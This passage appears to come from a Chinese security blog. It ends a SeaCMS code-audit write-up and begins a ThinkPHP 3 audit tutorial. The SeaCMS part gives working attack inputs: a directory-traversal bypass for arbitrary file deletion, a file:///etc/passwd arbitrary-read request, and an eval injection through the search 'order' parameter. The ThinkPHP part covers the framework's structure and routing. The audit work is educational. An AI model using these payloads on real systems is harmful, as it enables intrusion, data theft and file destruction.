class="hljs-number">0x7e</span>,DATABASE()));<br></code></pre></td></tr></table></figure><p>这个前提是要知道存在的表名，否则会因为表名不存在报错而没有执行我们注入的报错语句</p><p>表名一般都很好猜测，其次这里既然是参数传来，我们抓包应该也能获取到</p><p>2）循环备份逻辑干扰结果判断</p><p>详细读了代码，发现注入sql语句会导致网站一直循环备份，影响sql注入的结果，我没有找到停止循环的方式，很烦。</p><p>不过该处的循环方式采用的是自动发起一个form表单，相当于再次访问该网页。于是我便用burp来发包，确保只看第一个数据包</p><img src="img/seacms/image-20210709161343367.png" alt="image-20210709161343367" style="zoom:50%;" /><h2 id="目录穿越"><a href="#目录穿越" class="headerlink" title="目录穿越"></a>目录穿越</h2><p>这一个就比较有意思了，在Seay扫描结果中发现一个可能任意文件删除</p><img src="img/seacms/image-20210709172002654.png" alt="image-20210709172002654" style="zoom:50%;" /><p>现在浏览器中打开该网页，有种目录遍历的感觉呀</p><img src="img/seacms/image-20210709172057928.png" alt="image-20210709172057928" style="zoom:50%;" /><p>查看代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">require_once</span>(dirname(<span class="hljs-keyword">__FILE__</span>).<span class="hljs-string">&quot;/config.php&quot;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$action</span>))<br>&#123;<br><span class="hljs-variable">$action</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>&#125;<br><span class="hljs-variable">$dirTemplate</span>=<span class="hljs-string">&quot;../templets&quot;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$action</span>==<span class="hljs-string">&#x27;edit&#x27;</span>)&#123;&#125;<br><span class="hljs-keyword">elseif</span>(<span class="hljs-variable">$action</span>==<span class="hljs-string">&#x27;del&#x27;</span>)&#123;&#125;<br><span class="hljs-keyword">elseif</span>(<span class="hljs-variable">$action</span>==<span class="hljs-string">&#x27;add&#x27;</span>)&#123;&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>  <span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$path</span>)) <span class="hljs-variable">$path</span>=<span class="hljs-variable">$dirTemplate</span>; <span class="hljs-keyword">else</span> <span class="hljs-variable">$path</span>=strtolower(<span class="hljs-variable">$path</span>);<br><span class="hljs-keyword">if</span>(substr(<span class="hljs-variable">$path</span>,<span class="hljs-number">0</span>,<span class="hljs-number">11</span>)!=<span class="hljs-variable">$dirTemplate</span>)&#123;<br>ShowMsg(<span class="hljs-string">&quot;只允许编辑templets目录！&quot;</span>,<span class="hljs-string">&quot;admin_template.php&quot;</span>);<br><span class="hljs-keyword">exit</span>;<br>&#125;<br><span class="hljs-variable">$flist</span>=getFolderList(<span class="hljs-variable">$path</span>);<br><span class="hljs-keyword">include</span>(sea_ADMIN.<span class="hljs-string">&#x27;/templets/admin_template.htm&#x27;</span>);<br><span class="hljs-keyword">exit</span>();<br>&#125;<br></code></pre></td></tr></table></figure><p>截取 <code>$path</code> 前11位字符，如果不等于 <code>../templets</code> 则直接退出</p><p>前11位字符控制了，但我们还可以控制后面的字符：<code>../templets/../../</code></p><img src="img/seacms/image-20210709173837198.png" alt="image-20210709173837198" style="zoom:50%;" /><p>到这，我们有了整个操作系统文件的基础控制权，包括浏览，删除等操作</p><p>具体看了seacms提供的功能，对应每个文件都会有删除功能，而且同样只限制了前11位字符，可以绕过实现任意文件删除，而且此处因为可以浏览操作系统中存在哪些文件，于是删除哪些文件都能知道路径，做到「真任意文件删除」</p><p>另外本处只能通过<strong>编辑</strong>功能查看部分后缀文件，虽然有限，但同样能看到操作系统中的所有符合要求的文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-variable">$filetype</span>!=<span class="hljs-string">&quot;html&quot;</span> &amp;&amp; <span class="hljs-variable">$filetype</span>!=<span class="hljs-string">&quot;htm&quot;</span> &amp;&amp; <span class="hljs-variable">$filetype</span>!=<span class="hljs-string">&quot;js&quot;</span> &amp;&amp; <span class="hljs-variable">$filetype</span>!=<span class="hljs-string">&quot;css&quot;</span> &amp;&amp; <span class="hljs-variable">$filetype</span>!=<span class="hljs-string">&quot;txt&quot;</span>)<br>&#123;<br>ShowMsg(<span class="hljs-string">&quot;操作被禁止！&quot;</span>,<span class="hljs-string">&quot;admin_template.php&quot;</span>);<br><span class="hljs-keyword">exit</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h2><blockquote><p>admin/templets/admin_collect_ruleadd2.htm</p></blockquote><p>这个htm文件通过 <code>file_get_contents()</code> 读取 <code>$siteurl</code> 的内容</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//96-101</span><br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-variable">$content</span> = !<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$showcode</span>)?@file_get_contents(<span class="hljs-variable">$siteurl</span>):<span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$content</span> = <span class="hljs-variable">$coding</span>==<span class="hljs-string">&#x27;gb2312&#x27;</span>?gbutf8(<span class="hljs-variable">$content</span>):<span class="hljs-variable">$content</span>;<br><span class="hljs-keyword">if</span>(!<span class="hljs-variable">$content</span>) <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;读取URL出错&quot;</span>;<br><span class="hljs-keyword">echo</span> htmlspecialchars(<span class="hljs-variable">$content</span>);<br></code></pre></td></tr></table></figure><p>全局搜索包含<code>admin_collect_ruleadd2.htm</code>的文件，发现admin/admin_collect.php和admin/admin_collect_news.php两个文件均有包含，大致看了内容差不多，按照里面的逻辑构造，利用变量覆盖，最终构造payload如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">POST:http:<span class="hljs-comment">//seacms.test:8888/admin/admin_collect_news.php</span><br>action=addrule&amp;step=<span class="hljs-number">2</span>&amp;itemname=<span class="hljs-number">1</span>&amp;siteurl=file:<span class="hljs-comment">///etc/passwd&amp;showcode=111</span><br></code></pre></td></tr></table></figure><p>效果：</p><img src="img/seacms/image-20210712182104431.png" alt="image-20210712182104431" style="zoom:50%;" /><p>在php中file_get_contents()也可以造成SSRF漏洞</p><h2 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h2><h3 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h3><blockquote><p>include/main.class.php</p></blockquote><p>该文件有5个差不多的<code>eval</code>语句，具体逻辑有点复杂，我们先直接查看关键语句，可能会被<code>eval</code>执行的<code>$strIf</code>基本来自<code>$content</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">parseIf</span>(<span class="hljs-params"><span class="hljs-variable">$content</span></span>)</span>&#123;<br>  <span class="hljs-variable">$labelRule</span> = buildregx(<span class="hljs-string">&quot;&#123;if:(.*?)&#125;(.*?)&#123;end if&#125;&quot;</span>,<span class="hljs-string">&quot;is&quot;</span>);<br>  preg_match_all(<span class="hljs-variable">$labelRule</span>,<span class="hljs-variable">$content</span>,<span class="hljs-variable">$iar</span>);<br>  <span class="hljs-variable">$strIf</span>=<span class="hljs-variable">$iar</span>[<span class="hljs-number">1</span>][<span class="hljs-variable">$m</span>];<br>  ……<br>@<span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;if(&quot;</span>.<span class="hljs-variable">$strIf</span>.<span class="hljs-string">&quot;)&#123;\$ifFlag=true;&#125;else&#123;\$ifFlag=false;&#125;&quot;</span>);<br>  ……<br>&#125;<br></code></pre></td></tr></table></figure><p>然后追踪一下<code>parseIf()</code>函数</p><hr><blockquote><p>search.php</p></blockquote><p>其中 <code>$content</code> 来自一个缓存文件，为搜索结果展示给用户的 HTML 页面</p><p>在 <code>echoSearchPage()</code> 中，将会对 <code>$content</code> 部分内容做定制替换</p><p>最后 <code>$content</code> 将被 <code>patseIf()</code> 执行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&quot;include/common.php&quot;</span>);<br><span class="hljs-keyword">require_once</span>(sea_INC.<span class="hljs-string">&quot;/main.class.php&quot;</span>);<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_GET</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$k</span>=&gt;<span class="hljs-variable">$v</span>)<br>&#123;<br><span class="hljs-variable">$$k</span>=_RunMagicQuotes(gbutf8(RemoveXSS(<span class="hljs-variable">$v</span>)));<br><span class="hljs-variable">$schwhere</span>.= <span class="hljs-string">&quot;&amp;<span class="hljs-subst">$k</span>=&quot;</span>.urlencode(<span class="hljs-variable">$$k</span>);<br>&#125;<br><span class="hljs-variable">$page</span> = (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$page</span>) &amp;&amp; is_numeric(<span class="hljs-variable">$page</span>)) ? <span class="hljs-variable">$page</span> : <span class="hljs-number">1</span>;<br>echoSearchPage();<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">echoSearchPage</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">if</span>(intval(<span class="hljs-variable">$searchtype</span>)==<span class="hljs-number">5</span>)<br>&#123;<br><span class="hljs-variable">$searchTemplatePath</span> = <span class="hljs-string">&quot;/templets/&quot;</span>.<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;cfg_df_style&#x27;</span>].<span class="hljs-string">&quot;/&quot;</span>.<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;cfg_df_html&#x27;</span>].<span class="hljs-string">&quot;/cascade.html&quot;</span>;<br>      ……<br>    &#125;<br>  ……<br>    <span class="hljs-variable">$content</span> = str_replace(<span class="hljs-string">&quot;&#123;searchpage:page&#125;&quot;</span>,<span class="hljs-variable">$page</span>,<span class="hljs-variable">$content</span>);<br><span class="hljs-variable">$content</span> = str_replace(<span class="hljs-string">&quot;&#123;seacms:searchword&#125;&quot;</span>,<span class="hljs-variable">$searchword</span>,<span class="hljs-variable">$content</span>);<br><span class="hljs-variable">$content</span> = str_replace(<span class="hljs-string">&quot;&#123;seacms:searchnum&#125;&quot;</span>,<span class="hljs-variable">$TotalResult</span>,<span class="hljs-variable">$content</span>);<br><span class="hljs-variable">$content</span> = str_replace(<span class="hljs-string">&quot;&#123;searchpage:ordername&#125;&quot;</span>,<span class="hljs-variable">$order</span>,<span class="hljs-variable">$content</span>);<br>  ……<br><span class="hljs-variable">$content</span>=<span class="hljs-variable">$mainClassObj</span>-&gt;parseIf(<span class="hljs-variable">$content</span>);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>通过 <code>search.php</code> 的代码可以知道的是该文件具有单独执行能力且位于前台，该文件单独对GPC数据做了全局过滤，同样使用了<code>$$</code>的方式赋值GPC数据，可能造成变量覆盖的问题，从而导致在<code>$content</code>替换的内容上我们可控，最终控制<code>parseIf</code>  中 <code>eval()</code>参数，从造成任意代码执行的漏洞。</p><p>以上粗略估计可能存在任意代码执行的漏洞，但程序中变量传递十分复杂，变量能否按我们的需求传递到eval()中执行还不知道，追踪一个参数看看具体过程是否可以实现</p><h3 id="正向利用"><a href="#正向利用" class="headerlink" title="正向利用"></a>正向利用</h3><p>我们可以通过<code>$page</code>、<code>$searchword</code>、<code>$TotalResult</code>、<code>$order</code>等参数控制<code>$content</code>的部分内容，其中只有<code>$order</code>是完全可控的。<code>$order</code>替换的内容是<code>&#123;searchpage:ordername&#125;</code>，在全局搜索中只有<code>cascade.html</code>文件具有这些信息</p><p>当<code>$searchtype==5</code>时，<code>$content</code>文件的内容来自于<code>cascade.html</code>，这个文件内容具有以下关键信息：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;&#123;searchpage:order-time-link&#125;&quot;</span> &#123;<span class="hljs-attr">if:</span>&quot;&#123;<span class="hljs-attr">searchpage:ordername</span>&#125;&quot;==<span class="hljs-string">&quot;time&quot;</span>&#125; <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-success&quot;</span> &#123;<span class="hljs-attr">else</span>&#125; <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-default&quot;</span> &#123;<span class="hljs-attr">end</span> <span class="hljs-attr">if</span>&#125; <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;orderhits&quot;</span>&gt;</span>最新上映<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;&#123;searchpage:order-hit-link&#125;&quot;</span> &#123;<span class="hljs-attr">if:</span>&quot;&#123;<span class="hljs-attr">searchpage:ordername</span>&#125;&quot;==<span class="hljs-string">&quot;hit&quot;</span>&#125; <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-success&quot;</span> &#123;<span class="hljs-attr">else</span>&#125; <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-default&quot;</span> &#123;<span class="hljs-attr">end</span> <span class="hljs-attr">if</span>&#125; <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;orderaddtime&quot;</span>&gt;</span>最近热播<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;&#123;searchpage:order-score-link&#125;&quot;</span> &#123;<span class="hljs-attr">if:</span>&quot;&#123;<span class="hljs-attr">searchpage:ordername</span>&#125;&quot;==<span class="hljs-string">&quot;score&quot;</span>&#125; <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-success&quot;</span> &#123;<span class="hljs-attr">else</span>&#125; <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-default&quot;</span> &#123;<span class="hljs-attr">end</span> <span class="hljs-attr">if</span>&#125; <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;ordergold&quot;</span>&gt;</span>评分最高<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br></code></pre></td></tr></table></figure><p>便可以通过<code>$order</code>参数替换<code>$content</code>中的<code>&#123;searchpage:ordername&#125;</code>。</p><p>至于需要构造什么样的内容，要看 <code>parseif()</code> 解析什么内容，程序代码太复杂，直接打断点看 <code>parseIf()</code> 中匹配 <code>$content</code> 使用的正则为：<code>/&#123;if:(.*?)&#125;(.*?)&#123;end if&#125;/is</code></p><img src="img/seacms/image-20210712140321014.png" alt="image-20210712140321014" style="zoom:50%;" /><p>正则表达式 <code>/&#123;if:(.*?)&#125;(.*?)&#123;end if&#125;/is</code> 的匹配结果将会有两个匹配子组，最终匹配结果为 <code>$iar</code> 数组，其中 <code>$iar[0]</code> 为整个匹配结果，<code>$iar[1]</code> 和 <code>$iar[2]</code> 为两个匹配子组</p><img src="img/seacms/image-20210712151442878.png" alt="image-20210712151442878" style="zoom:50%;" /><p>其中 <code>eval()</code> 要执行的 <code>$strIf</code> 来自 <code>$iar[1]</code> 即第一个匹配子组</p><img src="img/seacms/image-20210712151703350.png" alt="image-20210712151703350" style="zoom:50%;" /><p>那么我们现在要构造的结果内容就清晰了，构造逻辑大致如下：</p><img src="img/seacms/image-20210712153232403.png" alt="image-20210712153232403" style="zoom:50%;" /><p>代码执行的payload如下：</p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sas">searchtype=5<span class="hljs-variable">&amp;searchword</span>=d<span class="hljs-variable">&amp;order</span>=&#125;&#123;<span class="hljs-meta">end</span> <span class="hljs-meta">if</span>&#125;&#123;<span class="hljs-meta">if</span>:1)phpinfo();<span class="hljs-meta">if</span>(1&#125;&#123;<span class="hljs-meta">end</span> <span class="hljs-meta">if</span>&#125;<br></code></pre></td></tr></table></figure><p>payload执行流程如下：</p><img src="img/seacms/image-20210712153756773.png" alt="image-20210712153756773" style="zoom:50%;" /><h1 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h1><p>通过审计 SeaCMS 主要学习他的程序逻辑，而且 SeaCMS 还有几个有趣的漏洞，审计下来收获颇丰 </p><p>参考：</p><p>海洋cms官网：<a href="https://www.seacms.net/">https://www.seacms.net/</a></p><p><a href="https://github.com/SukaraLin/php_code_audit_project">https://github.com/SukaraLin/php_code_audit_project</a></p><p>seacms多个版本的代码执行漏洞：<a href="https://github.com/jiangsir404/PHP-code-audit/tree/master/seacms">https://github.com/jiangsir404/PHP-code-audit/tree/master/seacms</a></p>]]></content>
    
    
    <categories>
      
      <category>php代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PHP</tag>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>总结 ThinkPHP3 代码审计方法</title>
    <link href="/2021/09/10/thinkphp3/"/>
    <url>/2021/09/10/thinkphp3/</url>
    
    <content type="html"><![CDATA[<h1 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00 简介"></a>0x00 简介</h1><p>ThinkPHP 是国内著名的 php开发框架，基于MVC模式，最早诞生于2006年初，原名FCS，2007年元旦正式更名为ThinkPHP</p><p>本文主要分析 ThinkPHP v3 的程序代码，通过对 TP3 代码结构分析、底层代码分析、经典历史漏洞复现分析等，学习如何审计 MVC 模式的程序代码，遇到使用 TP3 的代码能够独立审计。即使不想对 TP3 代码做过多了解的小伙伴通过本文也能对TP3程序的漏洞有个清晰的认识</p><p>ThinkPHP v3.x 系列最早发布于 2012 年，于 2018 年停止维护，其中使用最多的是在 2014 年发布的 3.2.3，本文审计代码也是这个版本。也许TP 3现在很少能见到了，但通过对TP 3的完整代码分析，能更好入门 MVC 程序的代码审计</p><h1 id="0x01了解ThinkPHP-3"><a href="#0x01了解ThinkPHP-3" class="headerlink" title="0x01了解ThinkPHP 3"></a>0x01了解ThinkPHP 3</h1><h2 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h2><p>1）tp3程序根目录（默认也是web部署目录）</p><p>TP3的初始目录结构如下：</p><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs delphi">www  WEB部署目录（或者子目录）<br>├─<span class="hljs-keyword">index</span>.php       入口文件<br>├─README.md       README文件<br>├─Application     应用目录，Application目录默认是空的，但是第一次访问入口文件会自动生成<br>├─<span class="hljs-keyword">Public</span>          资源文件目录<br>└─ThinkPHP        框架目录<br></code></pre></td></tr></table></figure><blockquote><p>web根目录部署常见问题</p></blockquote><p>这个时期的 web 根目录部署上都有一个明显的问题，程序的所有文件都位于在 WEB 根目录目录下，这将导致程序的敏感文件也会可以通过 web 服务获取。如可以直接访问 Application/Runtime/Logs/ 下的日志文件，网上也有对应的通过爆破获取 tp3 程序中的日志文件</p><img src="img/ThinkPHP3/image-20210730105644942.png" alt="image-20210730105644942" style="zoom: 33%;" /><p>2）框架目录</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">├─ThinkPHP 框架系统目录（可以部署在非web目录下面）<br>│  ├─Common       核心公共函数目录<br>│  ├─Conf         核心配置目录 <br>│  ├─Lang         核心语言包目录<br>│  ├─Library      框架类库目录<br>│  │  ├─Think     核心Think类库包目录<br>│  │  ├─Behavior  行为类库目录<br>│  │  ├─Org       Org类库包目录<br>│  │  ├─Vendor    第三方类库目录<br>│  │  ├─<span class="hljs-operator"> ...      </span>更多类库目录<br>│  ├─Mode         框架应用模式目录<br>│  ├─Tpl          系统模板目录<br>│  ├─<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">LICENSE</span>.</span></span>txt  框架授权协议文件<br>│  ├─logo.png     框架LOGO文件<br>│  ├─<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">README</span>.</span></span>txt   框架README文件<br>│  └─<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ThinkPHP</span>.</span></span>php 框架入口文件<br></code></pre></td></tr></table></figure><p>3）应用目录</p><p>TP 3 采用模块化的设计架构，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php">Application      默认应用目录（可以设置）<br>├─Common         公共模块（不能直接访问）<br>├─Home           前台模块<br>├─Admin          后台模块<br>├─...            其他更多模块<br>├─Runtime        默认运行时目录（可以设置）<br></code></pre></td></tr></table></figure><p>每个模块是相对独立的，其目录结构如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php">├─Module         模块目录<br>│  ├─Conf        配置文件目录<br>│  ├─Common      公共函数目录<br>│  ├─Controller  控制器目录<br>│  ├─Model       模型目录<br>│  ├─Logic       逻辑目录（可选）<br>│  ├─Service     Service目录（可选）<br>│  ... 更多分层目录可选<br>│  └─View        视图目录<br></code></pre></td></tr></table></figure><p>Common模块是一个特殊的模块，是应用的公共模块，访问所有的模块之前都会首先加载公共模块下面的配置文件（<code>Conf/config.php</code>）和公共函数文件（<code>Common/function.php</code>）</p><h2 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h2><p>在 ThinkPHP 中，一般来说应用的配置文件是自动加载的，加载的顺序是：</p><p>惯例配置-&gt;应用配置-&gt;模式配置-&gt;调试配置-&gt;状态配置-&gt;模块配置-&gt;扩展配置-&gt;动态配置</p><blockquote><p>以上是配置文件的加载顺序，后面的配置会覆盖之前的同名配置</p></blockquote><ul><li>惯例配置</li></ul><p>惯例配置文件：<code>ThinkPHP/Conf/convention.php</code>。该文件一般不会修改</p><ul><li>应用配置</li></ul><p>应用配置文件也就是调用所有模块之前都会首先加载的<strong>公共配置文件</strong>，默认位于 <code>Application/Common/Conf/config.php</code></p><ul><li>模块配置</li></ul><p>每个模块会自动加载自己的配置文件，位于 <code>Application/当前模块名/Conf/config.php</code></p><hr><p>在获取到目标程序源码时翻一翻这些配置文件主要收获在于获取数据库的配置信息</p><p>另外也可以翻翻<strong>模型</strong>代码，可能会有意外收获，因为在TP 3中实例化模型的时候可以使用dns连接数据库</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">new</span> \Home\Model\NewModel(<span class="hljs-string">&#x27;blog&#x27;</span>,<span class="hljs-string">&#x27;think_&#x27;</span>,<span class="hljs-string">&#x27;mysql://root:1234@localhost/demo&#x27;</span>);<br></code></pre></td></tr></table></figure><p>另外一点需要注意的是，TP3中一个配置文件就可以实现很多信息的配置，如<strong>数据库配置信息</strong>，<strong>路由规则配</strong>置等都会放在一个文件中。在TP5中则是通过专门的文件去配置不同的需求，如路由配置文件专门负责配置路由，数据库配置文件专门负责配置数据库信息</p><h2 id="路由处理"><a href="#路由处理" class="headerlink" title="路由处理"></a>路由处理</h2><p>在 TP3 中默认路由处理方式如下：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>tp3.com<span class="hljs-regexp">/index.php/</span>Home<span class="hljs-regexp">/Index/i</span>ndex<span class="hljs-regexp">/id/</span><span class="hljs-number">1</span><br>              入口文件模块<span class="hljs-regexp">/控制器/</span>方法/参数<br></code></pre></td></tr></table></figure><p>还可以使用兼容模式</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">index.php?s=Home<span class="hljs-regexp">/Index/i</span>ndex<span class="hljs-regexp">/id/</span><span class="hljs-number">1</span><br>入口文件模块<span class="hljs-regexp">/控制器/</span>方法/参数<br></code></pre></td></tr></table></figure><hr><p>TP3 具有路由转发的功能，具体路由规则在<strong>应用配置文件，或者模块配置文件</strong>中，上面有提及这两个文件的位置</p><p>配置方式如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 开启路由</span><br><span class="hljs-string">&#x27;URL_ROUTER_ON&#x27;</span>   =&gt; <span class="hljs-literal">true</span>,<br><span class="hljs-comment">// 路由规则</span><br><span class="hljs-string">&#x27;URL_ROUTE_RULES&#x27;</span>=&gt; <span class="hljs-keyword">array</span>(<br>    <span class="hljs-string">&#x27;news/:year/:month/:day&#x27;</span> =&gt; <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;News/archive&#x27;</span>, <span class="hljs-string">&#x27;status=1&#x27;</span>),<br>    <span class="hljs-string">&#x27;news/:id&#x27;</span>               =&gt; <span class="hljs-string">&#x27;News/read&#x27;</span>,<br>    <span class="hljs-string">&#x27;news/read/:id&#x27;</span>          =&gt; <span class="hljs-string">&#x27;/news/:1&#x27;</span>,<br>),<br></code></pre></td></tr></table></figure><p>如果路由规则位于应用配置文件，路由规则则作用于全局。如果路由规则位于模块配置文件，则只作用于当前模块，在访问对应路由时要加上模块名，如在home模块配置文件定义了如上的路由，访问方式为<code>http://test.com/home/news/1</code></p><h2 id="快捷方法"><a href="#快捷方法" class="headerlink" title="快捷方法"></a>快捷方法</h2><p>TP 3 对一些经常使用操作封装成了<strong>快捷方法</strong>，目的在于使程序更加简单安全。在TP 3官方文档中并没有做系统的介绍，不过在TP 5中就有系统整理，并且还给了一个规范命名：<strong>助手函数</strong></p><p>快捷方法来自 ThinkPHP/Common/functions.php，下面介绍几个</p><h3 id="I方法"><a href="#I方法" class="headerlink" title="I方法"></a>I方法</h3><p>PHP 程序一般使用 <code>$_GET, $_POST</code> 等全局变量获取外部数据， 在ThinkPHP封装了一个<strong>I方法</strong>可以更加方便和安全的获取外部变量，用法格式如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">I(<span class="hljs-string">&#x27;变量类型.变量名/修饰符&#x27;</span>,[<span class="hljs-string">&#x27;默认值&#x27;</span>],[<span class="hljs-string">&#x27;过滤方法或正则&#x27;</span>],[<span class="hljs-string">&#x27;额外数据源&#x27;</span>])<br></code></pre></td></tr></table></figure><p>示例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">echo</span> I(<span class="hljs-string">&#x27;get.id&#x27;</span>); <span class="hljs-comment">// 相当于 $_GET[&#x27;id&#x27;]</span><br><span class="hljs-keyword">echo</span> I(<span class="hljs-string">&#x27;get.name&#x27;</span>); <span class="hljs-comment">// 相当于 $_GET[&#x27;name&#x27;]</span><br><span class="hljs-keyword">echo</span> I(<span 